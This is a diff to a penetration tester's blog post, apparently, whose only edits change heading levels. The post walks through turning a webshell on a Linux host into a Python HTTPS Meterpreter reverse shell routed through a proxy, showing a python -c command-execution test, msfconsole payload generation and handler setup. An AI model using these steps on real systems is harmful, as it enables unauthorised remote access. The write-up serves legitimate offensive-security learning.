@@ -2,13 +2,13 @@
 
 I got into a situation recently where I had a webshell on a Linux system and I wanted to get a full Meterpreter. Initially we thought that there was no outbound access but after a fellow teammate reversed some .jar files found on the system the proxy server was discovered. Basically now I needed a reverse shell that allowed me to specify a proxy for outbound connections. I sent a quick message to @TheColonial on IRC and he let me know that Python HTTP/HTTPS Meterpreters could do what I needed.
 
-### Testing Python on the webshell
+## Testing Python on the webshell
 
 First I used the webshell to test the ability to run Python
 
 ```python -c "import os;os.system('ls')"```
 
-### Generating the payload
+## Generating the payload
 
 When this worked I moved onto generating the meterpreter payload:
 
@@ -39,7 +39,7 @@ msf payload(reverse_http) > generate -b '\x00\xff' -t raw -f meterp-python-https
 
 This will generate a one liner that you can use to trigger the payload.
 
-### Setting up the Handler
+## Setting up the Handler
 
 The next step is to setup the handler:
 ```
@@ -105,7 +105,7 @@ msf exploit(handler) > exploit -j
 [*] Exploit running as background job.
 ```
 
-### Triggering the payload
+## Triggering the payload
 
 Next take the payload one liner that was generated and use python -c to trigger the payload in your webshell(Other forms of command execution could be potentially used to do this as well):
 
